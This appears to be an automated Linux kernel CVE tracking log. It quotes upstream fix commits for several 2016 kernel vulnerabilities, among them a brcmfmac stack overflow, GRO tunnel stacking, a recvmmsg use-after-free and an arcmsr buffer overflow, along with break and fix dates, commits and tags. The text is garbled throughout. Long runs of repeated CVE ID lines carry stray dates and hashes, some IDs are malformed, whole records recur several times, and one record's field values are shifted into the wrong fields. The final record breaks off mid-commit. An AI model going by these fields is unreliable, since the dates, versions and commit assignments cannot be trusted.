CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
2012-09-28:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit ded89912156b1a47d940a0c954c43afbabd0c42c
Author: Arend Van Spriel <arend.vanspriel@broadcom.com>
Date:   Mon Sep 5 10:45:47 2016 +0100

    brcmfmac: avoid potential stack overflow in brcmf_cfg80211_start_ap()
    
    User-space can choose to omit NL80211_ATTR_SSID and only provide raw
    IE TLV data. When doing so it can provide SSID IE with length exceeding
    the allowed size. The driver further processes this IE copying it
    into a local variable without checking the length. Hence stack can be
    corrupted and used as exploit.
    
    Cc: stable@vger.kernel.org # v4.7
    Reported-by: Daxing Guo <freener.gdx@gmail.com>
    Reviewed-by: Hante Meuleman <hante.meuleman@broadcom.com>
    Reviewed-by: Pieter-Paul Giesberts <pieter-paul.giesberts@broadcom.com>
    Reviewed-by: Franky Lin <franky.lin@broadcom.com>
    Signed-off-by: Arend van Spriel <arend.vanspriel@broadcom.com>
    Signed-off-by: Kalle Valo <kvalo@codeaurora.org>

 .../broadcom/brcm80211/brcmfmac/cfg80211.c         |    2 +-
 1 file changed, 1 insertion(+), 1 deletion(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-8658
Break Date: 2012-09-28
Break Commit: 1a87334239757b69eb9885979c32bbf871b3ec88
Break Tag: 3.7
Linus Fix Date: 2016-09-07
Linus Commit: ded89912156b1a47d940a0c954c43afbabd0c42c
Linus Tag: 4.8
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit fac8e0f579695a3ecbc4d3cac369139d7f819971
Author: Jesse Gross <jesse@kernel.org>
Date:   Sat Mar 19 09:32:01 2016 -0700

    tunnels: Don't apply GRO to multiple layers of encapsulation.
    
    When drivers express support for TSO of encapsulated packets, they
    only mean that they can do it for one layer of encapsulation.
    Supporting additional levels would mean updating, at a minimum,
    more IP length fields and they are unaware of this.
    
    No encapsulation device expresses support for handling offloaded
    encapsulated packets, so we won't generate these types of frames
    in the transmit path. However, GRO doesn't have a check for
    multiple levels of encapsulation and will attempt to build them.
    
    UDP tunnel GRO actually does prevent this situation but it only
    handles multiple UDP tunnels stacked on top of each other. This
    generalizes that solution to prevent any kind of tunnel stacking
    that would cause problems.
    
    Fixes: bf5a755f ("net-gre-gro: Add GRE support to the GRO stack")
    Signed-off-by: Jesse Gross <jesse@kernel.org>
    Signed-off-by: David S. Miller <davem@davemloft.net>

 include/linux/netdevice.h |    4 ++--
 net/core/dev.c            |    2 +-
 net/ipv4/af_inet.c        |   15 ++++++++++++++-
 net/ipv4/gre_offload.c    |    5 +++++
 net/ipv4/udp_offload.c    |    6 +++---
 net/ipv6/ip6_offload.c    |   15 ++++++++++++++-
 6 files changed, 39 insertions(+), 8 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-8666
Break Date: 2014-01-07
Break Commit: bf5a755f5e9186406bbf50f4087100af5bd68e40
Break Tag: 3.14
Linus Fix Date: 2016-03-20
Linus Commit: fac8e0f579695a3ecbc4d3cac369139d7f819971
Linus Tag: 4.6
Stable Date: -
Stable Commit: -
Stable Tag: -

2016-09-11:
2016-09-11:
2016-09-11:
2016-09-11:
2016-09-11:
2016-09-11:
2016-09-11:
2016-09-11:
CVE-2013-4312:
CVE-2014-0181:
CVE-2014-0196:
CVE-2014-1739:
CVE-2014-2580:
CVE-2014-2851:
CVE-2014-3145:
CVE-2014-3153:
CVE-2014-3181:
CVE-2014-3184:
CVE-2014-3611:
CVE-2014-3673:
CVE-2014-3690:
CVE-2014-3940:
CVE-2014-4014:
CVE-2014-4171:
CVE-2014-4608:
CVE-2014-4611:
CVE-2014-4652:
CVE-2014-4653:
CVE-2014-4654:
CVE-2014-4655:
CVE-2014-4656:
CVE-2014-4656:
CVE-2014-4667:
CVE-2014-4699:
CVE-2014-5045:
CVE-2014-5471:
CVE-2014-5472:
CVE-2014-7283:
CVE-2014-7284:
CVE-2014-7841:
CVE-2014-7842:
CVE-2014-7843:
CVE-2014-8134:
CVE-2014-8480:
CVE-2014-8884:
CVE-2014-9090:
CVE-2014-9322:
CVE-2014-9322:
CVE-2014-9419:
CVE-2014-9420:
CVE-2014-9428:
CVE-2014-9529:
CVE-2014-9584:
CVE-2014-9585:
CVE-2014-9644:
CVE-2014-9683:
CVE-2014-9710:
CVE-2014-9715:
CVE-2014-9717:
CVE-2014-9728:
CVE-2014-9728:
CVE-2014-9728:
CVE-2014-9729:
CVE-2014-9730:
CVE-2014-9731:
CVE-2014-9803:
CVE-2014-9904:
CVE-2015-0272:
CVE-2015-1420:
CVE-2015-1421:
CVE-2015-1465:
CVE-2015-2666:
CVE-2015-3288:
CVE-2015-3636:
CVE-2015-4002:
CVE-2015-4692:
CVE-2015-5156:
CVE-2015-5327:
CVE-2015-5364:
CVE-2015-5366:
CVE-2015-6526:
CVE-2015-6937:
CVE-2015-7833:
CVE-2015-7872:
CVE-2015-7990:
CVE-2015-8104:
CVE-2015-8215:
CVE-2015-8551:
CVE-2015-8552:
CVE-2015-8569:
CVE-2015-8785:
CVE-2015-8787:
CVE-2015-8970:
CVE-2015-8970:
CVE-2016-0617:
CVE-2016-0723:
CVE-2016-0821:
CVE-2016-1237:
CVE-2016-1583:
CVE-2016-2186:
CVE-2016-2188:
CVE-2016-2384:
CVE-2016-2545:
CVE-2016-2549:
CVE-2016-2550:
CVE-2016-2782:
CVE-2016-3134:
CVE-2016-3136:
CVE-2016-3157:
CVE-2016-3689:
CVE-2016-3857:
CVE-2016-4558:
CVE-2016-4578:
CVE-2016-4578:
CVE-2016-4794:
CVE-2016-4794:
CVE-2016-4805:
CVE-2016-4997:
CVE-2016-4997:
CVE-2016-4997:
CVE-2016-4998:
CVE-2016-4998:
CVE-2016-4998:
CVE-2016-5195:
CVE-2016-5696:
CVE-2016-5728:
CVE-2016-5829:
CVE-2016-6198:
CVE-2016-7097:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7097:
CVE-2016-7425:
-:
CVE-2016-7425:
4.9:
CVE-2016-7425:
4.9:
CVE-2016-7042:
CVE-2016-7425:
CVE-2016-7097:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7097:
CVE-2016-7425:
CVE-2016-7097:
CVE-2016-7425:
CVE-2016-7097:
CVE-2016-7425:
CVE-2016-7097:
CVE-2016-7425:
CVE-2016-5696:
CVE-2016-5728:
CVE-2016-5829:
CVE-2016-6198:
CVE-2016-7097:
CVE-2016-7425:
CVE-2016-7097:
CVE-2016-7425:
4.9:
CVE-2016-7425:
4.9:
CVE-2016-7097:
CVE-2016-7425:
CVE-2016-6198:
CVE-2016-7097:
CVE-2016-7425:
CVE-2016-7097:
CVE-2016-7425:
CVE-2016-7097:
CVE-2016-7425:
CVE-2016-7097:
CVE-2016-7425:
CVE-2016-5829:
CVE-2016-6198:
CVE-2016-7097:
CVE-2016-7425:
4.7:
CVE-2016-6198:
CVE-2016-7097:
CVE-2016-7425:
CVE-2016-6198:
CVE-2016-7097:
CVE-2016-7425:
CVE-2016-7097:
CVE-2016-7425:
CVE-2016-6198:
CVE-2016-7097:
CVE-2016-7425:
CVE-2016-7097:
CVE-2016-7425:
CVE-2016-6198:
CVE-2016-7097:
CVE-2016-7425:
CVE-2016-6198:
CVE-22016-06-27:
CVE-2016-7425:
CVE-2016-6198:
CVE-2016-7097:
CVE-2016-7425:
CVE-2016-6198:
CVE-2016-7097:
CVE-2016-7425:
CVE-2016-5696:
CVE-2016-5728:
CVE-2016-5829:
CVE-2016-6198:
CVE-2016-7097:
CVE-2016-7425:
CVE-2016-5829:
CVE-2016-6198:
CVE-2016-7097:
CVE-2016-7425:
CVE-2016-6198:
CVE-2016-7097:
CVE-2016-7425:
9bf292bfca94694a721449e3fd752493856710f6:
CVE-2016-5829:
CVE-2016-6198:
CVE-2016-7097:
CVE-2016-7425:
CVE-2016-4997:
CVE-2016-4997:
CVE-2016-4997:
CVE-2016-4998:
CVE-2016-4998:
CVE-2016-4998:
CVE-2016-5195:
CVE-2016-5696:
CVE-2016-5728:
CVE-2016-5829:
CVE-2016-6198:
CVE-2016-7097:
CVE-2016-7425:
CVE-2016-5829:
CVE-2016-6198:
CVE-2016-7097:
CVE-2016-7425:
*************

*** This is a new CVE ***
This CVE has been resolved in 09a2499466dc69d1e54e8e879d4591cdd0ca17c8.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 09a2499466dc69d1e54e8e879d4591cdd0ca17c8
Author: Andrea Arcangeli <aarcange@redhat.com>
Date:   Fri Feb 26 15:19:28 2016 -0800

    mm: thp: fix SMP race condition between THP page fault and MADV_DONTNEED
    
    commit ad33bb04b2a6cee6c1f99fabb15cddbf93ff0433 upstream.
    
    pmd_trans_unstable()/pmd_none_or_trans_huge_or_clear_bad() were
    introduced to locklessy (but atomically) detect when a pmd is a regular
    (stable) pmd or when the pmd is unstable and can infinitely transition
    from pmd_none() and pmd_trans_huge() from under us, while only holding
    the mmap_sem for reading (for writing not).
    
    While holding the mmap_sem only for reading, MADV_DONTNEED can run from
    under us and so before we can assume the pmd to be a regular stable pmd
    we need to compare it against pmd_none() and pmd_trans_huge() in an
    atomic way, with pmd_trans_unstable().  The old pmd_trans_huge() left a
    tiny window for a race.
    
    Useful applications are unlikely to notice the difference as doing
    MADV_DONTNEED concurrently with a page fault would lead to undefined
    behavior.
    
    [js] 3.12 backport: no pmd_devmap in 3.12 yet.
    
    [akpm@linux-foundation.org: tidy up comment grammar/layout]
    Signed-off-by: Andrea Arcangeli <aarcange@redhat.com>
    Reported-by: Kirill A. Shutemov <kirill.shutemov@linux.intel.com>
    Signed-off-by: Andrew Morton <akpm@linux-foundation.org>
    Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>
    Cc: Vlastimil Babka <vbabka@suse.cz>
    Signed-off-by: Jiri Slaby <jslaby@suse.cz>
    Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>

 mm/memory.c |   14 ++++++++++++--
 1 file changed, 12 insertions(+), 2 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: -
CVE: 2016-09-11
Break Date: 09a2499466dc69d1e54e8e879d4591cdd0ca17c8
Break Commit: 3.14.79
Break Tag: -
Linus Fix Date: 2016-09-11
Linus Commit: 09a2499466dc69d1e54e8e879d4591cdd0ca17c8
Linus Tag: 3.14.79
Stable Date: -
Stable Commit: 2016-09-11
Stable Tag: 09a2499466dc69d1e54e8e879d4591cdd0ca17c8

CVE-2016-7117:
2.6:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-22016-06-27:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.67.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 34b88a68f26a75e4fded796f1a49c40f82234b7d
Author: Arnaldo Carvalho de Melo <acme@redhat.com>
Date:   Mon Mar 14 09:56:35 2016 -0300

    net: Fix use after free in the recvmmsg exit path
    
    The syzkaller fuzzer hit the following use-after-free:
    
      Call Trace:
       [<ffffffff8175ea0e>] __asan_report_load8_noabort+0x3e/0x40 mm/kasan/report.c:295
       [<ffffffff851cc31a>] __sys_recvmmsg+0x6fa/0x7f0 net/socket.c:2261
       [<     inline     >] SYSC_recvmmsg net/socket.c:2281
       [<ffffffff851cc57f>] SyS_recvmmsg+0x16f/0x180 net/socket.c:2270
       [<ffffffff86332bb6>] entry_SYSCALL_64_fastpath+0x16/0x7a
      arch/x86/entry/entry_64.S:185
    
    And, as Dmitry rightly assessed, that is because we can drop the
    reference and then touch it when the underlying recvmsg calls return
    some packets and then hit an error, which will make recvmmsg to set
    sock->sk->sk_err, oops, fix it.
    
    Reported-and-Tested-by: Dmitry Vyukov <dvyukov@google.com>
    Cc: Alexander Potapenko <glider@google.com>
    Cc: Eric Dumazet <edumazet@google.com>
    Cc: Kostya Serebryany <kcc@google.com>
    Cc: Sasha Levin <sasha.levin@oracle.com>
    Fixes: a2e2725541fa ("net: Introduce recvmmsg socket syscall")
    http://lkml.kernel.org/r/20160122211644.GC2470@redhat.com
    Signed-off-by: Arnaldo Carvalho de Melo <acme@redhat.com>
    Signed-off-by: David S. Miller <davem@davemloft.net>

 net/socket.c |   38 +++++++++++++++++++-------------------
 1 file changed, 19 insertions(+), 19 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-10
CVE: CVE-2016-7117
Break Date: 2009-10-12
Break Commit: a2e2725541fad72416326798c2d7fa4dafb7d337
Break Tag: 2.6
Linus Fix Date: 2016-03-14
Linus Commit: 34b88a68f26a75e4fded796f1a49c40f82234b7d
Linus Tag: 4.6
Stable Date: 2016-04-20
Stable Commit: 902b916d00ba73095b58a9a8dfe926c6a7f635d5
Stable Tag: 3.14.67

CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 7bc2b55a5c030685b399bb65b6baa9ccc3d1f167
Author: Dan Carpenter <dan.carpenter@oracle.com>
Date:   Thu Sep 15 16:44:56 2016 +0300

    scsi: arcmsr: Buffer overflow in arcmsr_iop_message_xfer()
    
    We need to put an upper bound on "user_len" so the memcpy() doesn't
    overflow.
    
    Cc: <stable@vger.kernel.org>
    Reported-by: Marco Grassi <marco.gra@gmail.com>
    Signed-off-by: Dan Carpenter <dan.carpenter@oracle.com>
    Reviewed-by: Tomas Henzl <thenzl@redhat.com>
    Signed-off-by: Martin K. Petersen <martin.petersen@oracle.com>

 drivers/scsi/arcmsr/arcmsr_hba.c |    8 +++++++-
 1 file changed, 7 insertions(+), 1 deletion(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-7425
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2016-09-15
Linus Commit: 7bc2b55a5c030685b399bb65b6baa9ccc3d1f167
Linus Tag: 4.9
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
2012-09-28:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit ded89912156b1a47d940a0c954c43afbabd0c42c
Author: Arend Van Spriel <arend.vanspriel@broadcom.com>
Date:   Mon Sep 5 10:45:47 2016 +0100

    brcmfmac: avoid potential stack overflow in brcmf_cfg80211_start_ap()
    
    User-space can choose to omit NL80211_ATTR_SSID and only provide raw
    IE TLV data. When doing so it can provide SSID IE with length exceeding
    the allowed size. The driver further processes this IE copying it
    into a local variable without checking the length. Hence stack can be
    corrupted and used as exploit.
    
    Cc: stable@vger.kernel.org # v4.7
    Reported-by: Daxing Guo <freener.gdx@gmail.com>
    Reviewed-by: Hante Meuleman <hante.meuleman@broadcom.com>
    Reviewed-by: Pieter-Paul Giesberts <pieter-paul.giesberts@broadcom.com>
    Reviewed-by: Franky Lin <franky.lin@broadcom.com>
    Signed-off-by: Arend van Spriel <arend.vanspriel@broadcom.com>
    Signed-off-by: Kalle Valo <kvalo@codeaurora.org>

 .../broadcom/brcm80211/brcmfmac/cfg80211.c         |    2 +-
 1 file changed, 1 insertion(+), 1 deletion(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-8658
Break Date: 2012-09-28
Break Commit: 1a87334239757b69eb9885979c32bbf871b3ec88
Break Tag: 3.7
Linus Fix Date: 2016-09-07
Linus Commit: ded89912156b1a47d940a0c954c43afbabd0c42c
Linus Tag: 4.8
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit fac8e0f579695a3ecbc4d3cac369139d7f819971
Author: Jesse Gross <jesse@kernel.org>
Date:   Sat Mar 19 09:32:01 2016 -0700

    tunnels: Don't apply GRO to multiple layers of encapsulation.
    
    When drivers express support for TSO of encapsulated packets, they
    only mean that they can do it for one layer of encapsulation.
    Supporting additional levels would mean updating, at a minimum,
    more IP length fields and they are unaware of this.
    
    No encapsulation device expresses support for handling offloaded
    encapsulated packets, so we won't generate these types of frames
    in the transmit path. However, GRO doesn't have a check for
    multiple levels of encapsulation and will attempt to build them.
    
    UDP tunnel GRO actually does prevent this situation but it only
    handles multiple UDP tunnels stacked on top of each other. This
    generalizes that solution to prevent any kind of tunnel stacking
    that would cause problems.
    
    Fixes: bf5a755f ("net-gre-gro: Add GRE support to the GRO stack")
    Signed-off-by: Jesse Gross <jesse@kernel.org>
    Signed-off-by: David S. Miller <davem@davemloft.net>

 include/linux/netdevice.h |    4 ++--
 net/core/dev.c            |    2 +-
 net/ipv4/af_inet.c        |   15 ++++++++++++++-
 net/ipv4/gre_offload.c    |    5 +++++
 net/ipv4/udp_offload.c    |    6 +++---
 net/ipv6/ip6_offload.c    |   15 ++++++++++++++-
 6 files changed, 39 insertions(+), 8 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-8666
Break Date: 2014-01-07
Break Commit: bf5a755f5e9186406bbf50f4087100af5bd68e40
Break Tag: 3.14
Linus Fix Date: 2016-03-20
Linus Commit: fac8e0f579695a3ecbc4d3cac369139d7f819971
Linus Tag: 4.6
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
2012-09-28:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit ded89912156b1a47d940a0c954c43afbabd0c42c
Author: Arend Van Spriel <arend.vanspriel@broadcom.com>
Date:   Mon Sep 5 10:45:47 2016 +0100

    brcmfmac: avoid potential stack overflow in brcmf_cfg80211_start_ap()
    
    User-space can choose to omit NL80211_ATTR_SSID and only provide raw
    IE TLV data. When doing so it can provide SSID IE with length exceeding
    the allowed size. The driver further processes this IE copying it
    into a local variable without checking the length. Hence stack can be
    corrupted and used as exploit.
    
    Cc: stable@vger.kernel.org # v4.7
    Reported-by: Daxing Guo <freener.gdx@gmail.com>
    Reviewed-by: Hante Meuleman <hante.meuleman@broadcom.com>
    Reviewed-by: Pieter-Paul Giesberts <pieter-paul.giesberts@broadcom.com>
    Reviewed-by: Franky Lin <franky.lin@broadcom.com>
    Signed-off-by: Arend van Spriel <arend.vanspriel@broadcom.com>
    Signed-off-by: Kalle Valo <kvalo@codeaurora.org>

 .../broadcom/brcm80211/brcmfmac/cfg80211.c         |    2 +-
 1 file changed, 1 insertion(+), 1 deletion(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-8658
Break Date: 2012-09-28
Break Commit: 1a87334239757b69eb9885979c32bbf871b3ec88
Break Tag: 3.7
Linus Fix Date: 2016-09-07
Linus Commit: ded89912156b1a47d940a0c954c43afbabd0c42c
Linus Tag: 4.8
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit fac8e0f579695a3ecbc4d3cac369139d7f819971
Author: Jesse Gross <jesse@kernel.org>
Date:   Sat Mar 19 09:32:01 2016 -0700

    tunnels: Don't apply GRO to multiple layers of encapsulation.
    
    When drivers express support for TSO of encapsulated packets, they
    only mean that they can do it for one layer of encapsulation.
    Supporting additional levels would mean updating, at a minimum,
    more IP length fields and they are unaware of this.
    
    No encapsulation device expresses support for handling offloaded
    encapsulated packets, so we won't generate these types of frames
    in the transmit path. However, GRO doesn't have a check for
    multiple levels of encapsulation and will attempt to build them.
    
    UDP tunnel GRO actually does prevent this situation but it only
    handles multiple UDP tunnels stacked on top of each other. This
    generalizes that solution to prevent any kind of tunnel stacking
    that would cause problems.
    
    Fixes: bf5a755f ("net-gre-gro: Add GRE support to the GRO stack")
    Signed-off-by: Jesse Gross <jesse@kernel.org>
    Signed-off-by: David S. Miller <davem@davemloft.net>

 include/linux/netdevice.h |    4 ++--
 net/core/dev.c            |    2 +-
 net/ipv4/af_inet.c        |   15 ++++++++++++++-
 net/ipv4/gre_offload.c    |    5 +++++
 net/ipv4/udp_offload.c    |    6 +++---
 net/ipv6/ip6_offload.c    |   15 ++++++++++++++-
 6 files changed, 39 insertions(+), 8 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-8666
Break Date: 2014-01-07
Break Commit: bf5a755f5e9186406bbf50f4087100af5bd68e40
Break Tag: 3.14
Linus Fix Date: 2016-03-20
Linus Commit: fac8e0f579695a3ecbc4d3cac369139d7f819971
Linus Tag: 4.6
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-7117:
2.6:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-22016-06-27:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.67.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 34b88a68f26a75e4fded796f1a49c40f82234b7d
Author: Arnaldo Carvalho de Melo <acme@redhat.com>
Date:   Mon Mar 14 09:56:35 2016 -0300

    net: Fix use after free in the recvmmsg exit path
    
    The syzkaller fuzzer hit the following use-after-free:
    
      Call Trace:
       [<ffffffff8175ea0e>] __asan_report_load8_noabort+0x3e/0x40 mm/kasan/report.c:295
       [<ffffffff851cc31a>] __sys_recvmmsg+0x6fa/0x7f0 net/socket.c:2261
       [<     inline     >] SYSC_recvmmsg net/socket.c:2281
       [<ffffffff851cc57f>] SyS_recvmmsg+0x16f/0x180 net/socket.c:2270
       [<ffffffff86332bb6>] entry_SYSCALL_64_fastpath+0x16/0x7a
      arch/x86/entry/entry_64.S:185
    
    And, as Dmitry rightly assessed, that is because we can drop the
    reference and then touch it when the underlying recvmsg calls return
    some packets and then hit an error, which will make recvmmsg to set
    sock->sk->sk_err, oops, fix it.
    
    Reported-and-Tested-by: Dmitry Vyukov <dvyukov@google.com>
    Cc: Alexander Potapenko <glider@google.com>
